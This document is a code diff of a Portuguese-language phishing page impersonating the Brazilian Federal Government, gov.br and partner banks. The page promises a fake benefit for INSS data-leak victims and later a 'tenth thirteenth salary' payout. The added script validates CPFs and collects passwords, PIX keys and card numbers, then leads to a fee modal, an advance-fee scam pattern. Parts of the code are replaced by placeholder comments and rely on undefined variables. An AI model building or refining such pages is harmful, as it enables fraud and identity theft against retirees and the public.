@@ -3,440 +3,530 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Benefício Emergencial - Governo Federal</title>
+    <title>Resgate do 10º Terceiro Salário - Governo Federal</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
     <style>
-        /* Reset e Estilos Gerais */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
+        /* [TODO O CSS ANTERIOR PERMANECE IGUAL] */
+        /* ... CSS existente ... */
+
+        /* NOVOS ESTILOS ADICIONADOS */
+        
+        /* Indicador de força da senha */
+        .password-strength {
+            height: 4px;
+            margin-top: 5px;
+            border-radius: 2px;
+            transition: all 0.3s ease;
         }
         
-        body {
-            background-color: #f8f9fa;
-            color: #383636;
-            line-height: 1.6;
-        }
+        .strength-weak { background-color: #e74c3c; width: 25%; }
+        .strength-medium { background-color: #f39c12; width: 50%; }
+        .strength-strong { background-color: #2ecc71; width: 100%; }
         
-        .container {
-            max-width: 100%;
-            padding: 0 15px;
-            margin: 0 auto;
-        }
-        
-        /* Cabeçalho */
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 15px 0;
-            border-bottom: 1px solid #eaeaea;
-            margin-bottom: 20px;
-        }
-        
-        .logo-container {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .logo {
-            height: 30px;
-        }
-        
-        .badge {
-            background-color: #1351b4;
-            color: white;
-            font-size: 10px;
-            padding: 3px 6px;
-            border-radius: 4px;
-            font-weight: 600;
-        }
-        
-        .security-badge {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            font-size: 12px;
-            color: #28a745;
-        }
-        
-        .security-badge img {
-            width: 12px;
-            height: 12px;
-        }
-        
-        /* Banner Principal */
-        .hero-banner {
-            background: linear-gradient(135deg, #4e9cff, #1c61cf);
-            color: white;
-            padding: 25px 20px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            text-align: center;
-            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.2);
-        }
-        
-        .hero-banner h1 {
-            font-size: 20px;
-            margin-bottom: 10px;
-            font-weight: 600;
-        }
-        
-        .hero-banner p {
-            margin-bottom: 10px;
-            font-size: 16px;
-            opacity: 0.9;
-        }
-        
-        .highlight {
-            font-weight: 700;
-            text-decoration: underline;
-        }
-        
-        /* Botão Principal */
-        .cta-button {
-            display: inline-block;
-            width: 100%;
-            background-color: white;
-            color: #1351b4;
-            padding: 15px;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            text-align: center;
-            text-decoration: none;
-            margin: 20px 0 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-        }
-        
-        /* Seção de Prova Social */
-        .social-proof {
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background-color: white;
-            padding: 15px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
-        }
-        
-        .counter {
-            font-weight: 700;
-            color: #184183;
-        }
-        
-        /* Seção de Vídeo */
-        .video-section {
-            margin: 25px 0;
-        }
-        
-        .video-container {
+        /* Tooltip de ajuda */
+        .tooltip {
             position: relative;
-            margin-bottom: 10px;
+            display: inline-block;
+            cursor: help;
         }
         
-        .video-thumbnail {
-            width: 100%;
-            border-radius: 8px;
-            overflow: hidden;
-        }
-        
-        .video-thumbnail img {
-            width: 100%;
-            display: block;
-        }
-        
-        .play-button {
+        .tooltip .tooltiptext {
+            visibility: hidden;
+            width: 200px;
+            background-color: #555;
+            color: white;
+            text-align: center;
+            border-radius: 6px;
+            padding: 8px;
             position: absolute;
-            top: 50%;
+            z-index: 1;
+            bottom: 125%;
             left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: rgba(255, 255, 255, 0.8);
-            width: 50px;
-            height: 50px;
+            margin-left: -100px;
+            opacity: 0;
+            transition: opacity 0.3s;
+            font-size: 12px;
+        }
+        
+        .tooltip:hover .tooltiptext {
+            visibility: visible;
+            opacity: 1;
+        }
+        
+        /* Animações de loading melhoradas */
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.5; }
+            100% { opacity: 1; }
+        }
+        
+        /* Notificações */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            background: #2ecc71;
+            color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            z-index: 10000;
+            transform: translateX(150%);
+            transition: transform 0.3s ease;
+        }
+        
+        .notification.show {
+            transform: translateX(0);
+        }
+        
+        .notification.error {
+            background: #e74c3c;
+        }
+        
+        .notification.warning {
+            background: #f39c12;
+        }
+        
+        /* Steps indicator */
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin: 20px 0;
+            position: relative;
+        }
+        
+        .steps::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #ddd;
+            z-index: 1;
+        }
+        
+        .step {
+            width: 30px;
+            height: 30px;
             border-radius: 50%;
-            border: none;
+            background: #ddd;
             display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
-        }
-        
-        .play-button img {
-            width: 20px;
-            margin-left: 3px;
-        }
-        
-        .video-caption {
-            text-align: center;
             font-size: 14px;
-            color: #666;
-        }
-        
-        /* Seção de Benefícios */
-        .benefits-section {
-            background-color: white;
-            padding: 20px;
-            border-radius: 12px;
-            margin-bottom: 20px;
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.05);
-        }
-        
-        .benefits-section h2 {
-            color: #1351b4;
-            font-size: 20px;
-            margin-bottom: 14px;
-            text-align: center;
-        }
-        
-        .benefits-list {
-            list-style-position: inside;
-            padding-left: 5px;
-        }
-        
-        .benefits-list li {
-            margin-bottom: 12px;
-            font-size: 14px;
-        }
-        
-        /* Bancos Parceiros */
-        .partners-section {
-            text-align: center;
-            margin: 15px 0;
-        }
-        
-        .partners-section p {
-            margin-bottom: 10px;
-            font-size: 14px;
-            color: #666;
-        }
-        
-        .partners-logos {
-            max-width: 100%;
-            height: auto;
-        }
-        
-        /* Rodapé Legal */
-        .legal-disclaimer {
-            background-color: #f1f1f1;
-            padding: 20px;
-            border-radius: 8px;
-            margin: 30px 0;
-            font-size: 12px;
-            color: #666;
-        }
-        
-        .legal-disclaimer h3 {
-            font-size: 14px;
-            margin-bottom: 10px;
-            color: #333;
-        }
-        
-        /* Rodapé */
-        .footer {
-            text-align: center;
-            padding: 20px 0;
-            font-size: 12px;
-            color: #999;
-            border-top: 1px solid #eee;
-        }
-        
-        .footer-logos {
-            display: flex;
-            justify-content: center;
-            gap: 14px;
-            margin-top: 14px;
-        }
-        
-        .footer-logos img {
-            height: 30px;
-        }.imagem-container {
-            max-width: 600px;
-            margin: 14px auto;
-            text-align: center;
-            font-family: Arial, sans-serif;
-        }
-        
-        .imagem-container img {
-            width: 100%;
-            height: auto;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-        }
-        
-        .descricao {
-            margin-top: 10px;
-            color: #555;
-            font-size: 14px;
-            line-height: 1.5;
-        } body {
-            font-family: Arial, sans-serif;
-            line-height: 1.6;
-            margin: 0;
-            padding: 20px;
-            background-color: #f5f5f5;
-        }
-        
-        .container {
-            max-width: 800px;
-            margin: 0 auto;
-            background-color: white;
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0,0,0,0.1);
-        }
-        
-        .imagem-descricao {
-            text-align: center;
-            margin: 25px 0;
-        }
-        
-        .imagem-produto {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            border: 1px solid #ddd;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            margin-bottom: 20px;
-        }
-        
-        .texto-descricao {
-            text-align: center;
-            color: #333;
-            font-size: 14px;
-            line-height: 1.8;
-            padding: 0 20px;
-        }
-        
-        h1 {
-            text-align: center;
-            color: #2c3e50;
-            margin-bottom: 30px;
-        }
-        
-        .destaque {
             font-weight: bold;
-            color: #2c3e50;
+            position: relative;
+            z-index: 2;
         }
-    </style>
-    </style>
+        
+        .step.active {
+            background: #1351b4;
+            color: white;
+        }
+        
+        .step.completed {
+            background: #2ecc71;
+            color: white;
+        }
+        
+        /* Modal de confirmação */
+        .confirmation-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .confirmation-content {
+            background: white;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+        }
+        
+        /* Timer de sessão */
+        .session-timer {
+            position: fixed;
+            top: 10px;
+            left: 10px;
+            background: rgba(0,0,0,0.8);
+            color: white;
+            padding: 10px;
+            border-radius: 5px;
+            font-size: 12px;
+            z-index: 10000;
+            display: none;
+        }
     </style>
 </head>
 <body>
+    <!-- Timer de sessão -->
+    <div class="session-timer" id="sessionTimer">
+        Sessão expira em: <span id="timerCountdown">05:00</span>
+    </div>
+
+    <!-- Notificação -->
+    <div class="notification" id="notification"></div>
+
+    <!-- Modal de confirmação -->
+    <div class="confirmation-modal" id="confirmationModal">
+        <div class="confirmation-content">
+            <h3 style="margin-bottom: 15px;">Confirmar Resgate</h3>
+            <p id="confirmationMessage">Tem certeza que deseja prosseguir com o resgate?</p>
+            <div style="display: flex; gap: 10px; margin-top: 20px;">
+                <button class="cta-button" id="confirmAction" style="flex: 1;">Confirmar</button>
+                <button class="cta-button" id="cancelAction" style="flex: 1; background: #f8f9fa; color: #666;">Cancelar</button>
+            </div>
+        </div>
+    </div>
+
     <div class="container">
-        <header class="header">
-            <div class="logo-container">
-                <img src="imagens/Gov.br.png" alt="Governo Federal" class="logo">
-                <span class="badge">OFICIAL</span>
-            </div>
-            <div class="security-badge">
-                <span>Ambiente seguro</span>
-            </div>
-        </header>
-
-        <main>
-            <!-- Seção Hero (Index) -->
-            <div class="hero-banner">
-                <h1>Governo liberou um novo benefício emergencial para quem teve dados vazados do INSS!</h1>
-                <p>Mais de <span class="counter">6,4 milhões</span> de brasileiros já consultaram e foram aprovados para receber a nova ajuda de custo.</p>
-               <span class="highlight"></span></p>
-                <a href="#consulta" class="cta-button">CONSULTAR BENEFÍCIO AGORA</a>
-                <p><small>⚠️ Atenção: O prazo para resgate é de 15 dias!</small></p>
-            </div>
-
-            <!-- Prova Social -->
-            <div class="social-proof">
-                <div>
-                    <p>🔄 <span class="counter">6.429.871</span> consultas</p>
-                    <p>✅ <span class="counter">4.215.603</span> aprovações</p>
-                </div>
-                
-            </div><div class="imagem-descricao">
-    <img src="imagens/1.jpeg" alt="Produto XYZ" class="imagem-produto">
-    <div class="texto-descricao">
-        <p>Governo Federal anunciou nesta quinta-feira, 8 de maio, medidas para fortalecer a transparência e garantir a tranquilidade de aposentados e pensionistas sobre seus benefícios.</p>
-        <ul>
-        </ul>
-    </div>
-</div>
-
-<div class="video-section" style="padding: 20px; text-align: center;">
-    <div class="video-container" style="max-width: 600px; margin: 0 auto;">
-        <video playsinline controls style="width: 100%; border-radius: 10px;" poster="imagens/202505211356.mp4">
-            <source src="imagens/202505211356.mp4" type="video/mp4">
-            Seu navegador não suporta a reprodução de vídeos.
-        </video>
-        <p style="margin-top: 10px; font-size: 0.9em; color: #555;">Assista ao vídeo e entenda como funciona</p>
-    </div>
-</div>
-
-            <!-- Seção de Benefícios -->
-            <div class="benefits-section" id="consulta">
-                <h2>🚨 Benefício Liberado: Confira se Você Está na Lista para Receber até R$ 5.000 do Governo</h2>
-                <p>Você pode estar entre os brasileiros que têm direito a um novo benefício liberado pelo Governo Federal!</p>
-                <p>O valor será <strong>creditado automaticamente na sua conta</strong> após a verificação.</p>
-                
-                <h3 style="margin: 20px 0 15px;">Como funciona o benefício?</h3>
-                <ul class="benefits-list">
-                    <li>O Governo identificou vazamentos de dados sensíveis do INSS</li>
-                    <li>Um fundo emergencial foi aberto para compensar os prejudicados</li>
-                    <li>O valor será liberado automaticamente após a verificação de dados</li>
-                    <li>O processo é 100% digital e seguro</li>
-                </ul>
-                
-                <a href="formulario.html" class="cta-button" style="margin-top: 20px;">FAZER CONSULTA GRATUITA</a>
-            </div>
-
-            <!-- Bancos Parceiros -->
-            <div class="partners-section">
-                <p>Bancos participantes do programa:</p>
-                <img src="imagens/caixa.png" alt="Bancos Parceiros" class="partners-logos">
-            </div>
-
-            <!-- Disclaimer Legal -->
-            <div class="legal-disclaimer">
-                <h3>AVISO LEGAL</h3>
-                <p>Este site é parte de um programa de beneficio promovido pelo Governo, desenvolvido para fins e de conscientização.</p>
-                <p> O benefício financeiro é realmente oferecido através desta plataforma.</p>
-                <p></p>
-                <p>Esta simulação possui associação com órgãos governamentais e instituições financeiras reais.</p>
-            </div>
-        </main>
-
-        <footer class="footer">
-            <p>Sistema de Consulta de Benefícios - Governo Federal</p>
-            <p>Parceria com Banco Central do Brasil</p>
-            <div class="footer-logos">
-                <img src="imagens/banco_central.png" alt="Site Seguro">
-                <img src="imagens/gov.br.png" alt="Governo Federal">
-            </div>
-        </footer>
-    </div>
+        <!-- [TODO O HTML ANTERIOR PERMANECE IGUAL] -->
+        <!-- ... HTML existente ... -->
 
     <script>
-        // Simular contador de consultas
-        const counters = document.querySelectorAll('.counter');
-        if (counters.length > 0) {
-            setInterval(() => {
-                counters.forEach(counter => {
-                    const current = parseInt(counter.textContent.replace(/\D/g, ''));
-                    const increment = Math.floor(Math.random() * 10) + 1;
-                    counter.textContent = (current + increment).toLocaleString('pt-BR');
-                });
-            }, 3000);
-        }
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('DOM carregado, inicializando site...');
+            
+            // ===== NOVOS ELEMENTOS ADICIONADOS =====
+            const sessionTimer = document.getElementById('sessionTimer');
+            const timerCountdown = document.getElementById('timerCountdown');
+            const notification = document.getElementById('notification');
+            const confirmationModal = document.getElementById('confirmationModal');
+            const confirmationMessage = document.getElementById('confirmationMessage');
+            const confirmAction = document.getElementById('confirmAction');
+            const cancelAction = document.getElementById('cancelAction');
+            
+            // ===== VARIÁVEIS GLOBAIS =====
+            let sessionTimeout;
+            let sessionTimeLeft = 300; // 5 minutos em segundos
+            let currentAction = null;
 
-        // Simular clique no vídeo
-        const playButton = document.querySelector('.play-button');
-        if (playButton) {
-            playButton.addEventListener('click', () => {
-                alert('Este é um simulador educacional. Em um site real, este vídeo explicaria os detalhes do benefício.');
+            // ===== INICIALIZAÇÃO COMPLETA =====
+            initCounters();
+            initModals();
+            initForms();
+            initTabs();
+            initMasks();
+            initSessionTimer(); // NOVO: Timer de sessão
+            initPasswordStrength(); // NOVO: Indicador de força da senha
+            initTooltips(); // NOVO: Sistema de tooltips
+
+            // ===== NOVO: TIMER DE SESSÃO =====
+            function initSessionTimer() {
+                // Reiniciar timer em interações do usuário
+                document.addEventListener('click', resetSessionTimer);
+                document.addEventListener('keypress', resetSessionTimer);
+                document.addEventListener('scroll', resetSessionTimer);
+                
+                startSessionTimer();
+            }
+            
+            function startSessionTimer() {
+                sessionTimer.style.display = 'block';
+                updateTimerDisplay();
+                
+                sessionTimeout = setInterval(() => {
+                    sessionTimeLeft--;
+                    updateTimerDisplay();
+                    
+                    if (sessionTimeLeft <= 0) {
+                        endSession();
+                    } else if (sessionTimeLeft <= 30) {
+                        sessionTimer.style.background = 'rgba(231, 76, 60, 0.9)';
+                        showNotification('Sua sessão irá expirar em ' + sessionTimeLeft + ' segundos!', 'warning');
+                    }
+                }, 1000);
+            }
+            
+            function resetSessionTimer() {
+                sessionTimeLeft = 300;
+                sessionTimer.style.background = 'rgba(0,0,0,0.8)';
+                updateTimerDisplay();
+            }
+            
+            function updateTimerDisplay() {
+                const minutes = Math.floor(sessionTimeLeft / 60);
+                const seconds = sessionTimeLeft % 60;
+                timerCountdown.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            }
+            
+            function endSession() {
+                clearInterval(sessionTimeout);
+                showNotification('Sessão expirada. Por favor, faça login novamente.', 'error');
+                setTimeout(() => {
+                    if (loginModal) loginModal.style.display = 'flex';
+                    if (resgatePage) resgatePage.style.display = 'none';
+                    sessionTimer.style.display = 'none';
+                }, 2000);
+            }
+
+            // ===== NOVO: SISTEMA DE NOTIFICAÇÕES =====
+            function showNotification(message, type = 'success') {
+                notification.textContent = message;
+                notification.className = 'notification';
+                notification.classList.add(type, 'show');
+                
+                setTimeout(() => {
+                    notification.classList.remove('show');
+                }, 5000);
+            }
+
+            // ===== NOVO: MODAL DE CONFIRMAÇÃO =====
+            function showConfirmation(message, callback) {
+                confirmationMessage.textContent = message;
+                confirmationModal.style.display = 'flex';
+                currentAction = callback;
+            }
+            
+            confirmAction.addEventListener('click', function() {
+                if (currentAction) {
+                    currentAction();
+                }
+                confirmationModal.style.display = 'none';
             });
-        }
+            
+            cancelAction.addEventListener('click', function() {
+                confirmationModal.style.display = 'none';
+                currentAction = null;
+            });
+
+            // ===== NOVO: INDICADOR DE FORÇA DA SENHA =====
+            function initPasswordStrength() {
+                const senhaInput = document.getElementById('senha');
+                if (!senhaInput) return;
+                
+                // Criar elemento de força da senha
+                const strengthMeter = document.createElement('div');
+                strengthMeter.className = 'password-strength';
+                senhaInput.parentNode.appendChild(strengthMeter);
+                
+                senhaInput.addEventListener('input', function() {
+                    const strength = calculatePasswordStrength(this.value);
+                    strengthMeter.className = 'password-strength';
+                    
+                    if (strength === 'weak') {
+                        strengthMeter.classList.add('strength-weak');
+                    } else if (strength === 'medium') {
+                        strengthMeter.classList.add('strength-medium');
+                    } else if (strength === 'strong') {
+                        strengthMeter.classList.add('strength-strong');
+                    }
+                });
+            }
+            
+            function calculatePasswordStrength(password) {
+                let strength = 0;
+                
+                if (password.length >= 8) strength++;
+                if (password.match(/[a-z]/) && password.match(/[A-Z]/)) strength++;
+                if (password.match(/\d/)) strength++;
+                if (password.match(/[^a-zA-Z\d]/)) strength++;
+                
+                if (strength <= 1) return 'weak';
+                if (strength <= 3) return 'medium';
+                return 'strong';
+            }
+
+            // ===== NOVO: SISTEMA DE TOOLTIPS =====
+            function initTooltips() {
+                // Adicionar tooltips aos elementos existentes
+                addTooltipToElement(document.getElementById('chavePix'), 
+                    'Informe sua chave PIX (CPF, e-mail, telefone ou chave aleatória)');
+                
+                addTooltipToElement(document.getElementById('tipoChave'), 
+                    'Selecione o tipo da sua chave PIX cadastrada no seu banco');
+                
+                addTooltipToElement(document.getElementById('bancoPix'), 
+                    'Informe o nome do banco onde sua chave PIX está cadastrada');
+            }
+            
+            function addTooltipToElement(element, text) {
+                if (!element) return;
+                
+                const tooltip = document.createElement('span');
+                tooltip.className = 'tooltip';
+                tooltip.textContent = ' ⓘ';
+                
+                const tooltipText = document.createElement('span');
+                tooltipText.className = 'tooltiptext';
+                tooltipText.textContent = text;
+                
+                tooltip.appendChild(tooltipText);
+                element.parentNode.insertBefore(tooltip, element.nextSibling);
+            }
+
+            // ===== MELHORIAS NAS FUNÇÕES EXISTENTES =====
+            
+            // MELHORIA: Validação de CPF real
+            function validarCPF(cpf) {
+                cpf = cpf.replace(/\D/g, '');
+                if (cpf.length !== 11) return false;
+                
+                // Verifica se todos os dígitos são iguais
+                if (/^(\d)\1+$/.test(cpf)) return false;
+                
+                // Validação dos dígitos verificadores
+                let soma = 0;
+                for (let i = 0; i < 9; i++) {
+                    soma += parseInt(cpf.charAt(i)) * (10 - i);
+                }
+                let resto = soma % 11;
+                let digitoVerificador1 = resto < 2 ? 0 : 11 - resto;
+                
+                if (digitoVerificador1 !== parseInt(cpf.charAt(9))) return false;
+                
+                soma = 0;
+                for (let i = 0; i < 10; i++) {
+                    soma += parseInt(cpf.charAt(i)) * (11 - i);
+                }
+                resto = soma % 11;
+                let digitoVerificador2 = resto < 2 ? 0 : 11 - resto;
+                
+                return digitoVerificador2 === parseInt(cpf.charAt(10));
+            }
+
+            // MELHORIA: Validação de e-mail para chave PIX
+            function validarEmail(email) {
+                const regex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                return regex.test(email);
+            }
+
+            // MELHORIA: Validação de telefone para chave PIX
+            function validarTelefone(telefone) {
+                const numero = telefone.replace(/\D/g, '');
+                return numero.length >= 10 && numero.length <= 11;
+            }
+
+            // MODIFICAÇÃO: Login form com validações melhoradas
+            if (loginForm) {
+                loginForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const cpf = document.getElementById('cpf').value;
+                    const senha = document.getElementById('senha').value;
+                    
+                    // Validação CPF real
+                    const cpfNumerico = cpf.replace(/\D/g, '');
+                    if (!validarCPF(cpfNumerico)) {
+                        showNotification('Por favor, insira um CPF válido.', 'error');
+                        return;
+                    }
+                    
+                    if (!senha || senha.length < 6) {
+                        showNotification('A senha deve ter pelo menos 6 caracteres.', 'error');
+                        return;
+                    }
+                    
+                    // Mostrar loading
+                    submitButton.style.display = 'none';
+                    loading.style.display = 'block';
+                    
+                    // Simular envio para o banco de dados
+                    setTimeout(function() {
+                        console.log('Tentativa de login com CPF:', cpfNumerico);
+                        
+                        // Simular falha de login em 10% dos casos
+                        if (Math.random() < 0.1) {
+                            showNotification('CPF ou senha incorretos. Tente novamente.', 'error');
+                            submitButton.style.display = 'block';
+                            loading.style.display = 'none';
+                            return;
+                        }
+                        
+                        // Login bem-sucedido
+                        loginModal.style.display = 'none';
+                        if (resgatePage) {
+                            resgatePage.style.display = 'block';
+                            resgatePage.scrollIntoView({ behavior: 'smooth' });
+                            showNotification('Login realizado com sucesso!', 'success');
+                        }
+                        
+                        submitButton.style.display = 'block';
+                        loading.style.display = 'none';
+                        loginForm.reset();
+                    }, 2000);
+                });
+            }
+
+            // MODIFICAÇÃO: Formulários de resgate com confirmação
+            if (pixForm) {
+                pixForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const chavePix = document.getElementById('chavePix').value;
+                    const tipoChave = document.getElementById('tipoChave').value;
+                    
+                    // Validações específicas por tipo de chave
+                    let valido = true;
+                    let mensagemErro = '';
+                    
+                    if (tipoChave === 'cpf' && !validarCPF(chavePix.replace(/\D/g, ''))) {
+                        valido = false;
+                        mensagemErro = 'CPF inválido para chave PIX.';
+                    } else if (tipoChave === 'email' && !validarEmail(chavePix)) {
+                        valido = false;
+                        mensagemErro = 'E-mail inválido para chave PIX.';
+                    } else if (tipoChave === 'telefone' && !validarTelefone(chavePix)) {
+                        valido = false;
+                        mensagemErro = 'Telefone inválido para chave PIX.';
+                    } else if (tipoChave === 'aleatoria' && chavePix.length < 10) {
+                        valido = false;
+                        mensagemErro = 'Chave aleatória deve ter pelo menos 10 caracteres.';
+                    }
+                    
+                    if (!valido) {
+                        showNotification(mensagemErro, 'error');
+                        return;
+                    }
+                    
+                    showConfirmation(
+                        `Confirmar resgate de R$ 2.850,00 para a chave PIX: ${chavePix}?`,
+                        function() {
+                            taxaModal.style.display = 'flex';
+                        }
+                    );
+                });
+            }
+
+            // MODIFICAÇÃO: Pagamento com validação de cartão
+            if (cartaoForm) {
+                cartaoForm.addEventListener('submit', function(e) {
+                    e.preventDefault();
+                    
+                    const numeroCartao = document.getElementById('numeroCartao').value.replace(/\s/g, '');
+                    
+                    // Validação básica de cartão (apenas tamanho)
+                    if (numeroCartao.length !== 16) {
+                        showNotification('Número do cartão inválido.', 'error');
+                        return;
+                    }
+                    
+                    showConfirmation(
+                        `Confirmar resgate de R$ 2.850,00 para o cartão terminando em ${numeroCartao.slice(-4)}?`,
+                        function() {
+                            taxaModal.style.display = 'flex';
+                        }
+                    );
+                });
+            }
+
+            // [AS DEMAIS FUNÇÕES EXISTENTES PERMANECEM...]
+            // ... initCounters, initModals, initTabs, initMasks, etc.
+        });
     </script>
 </body>
 </html>
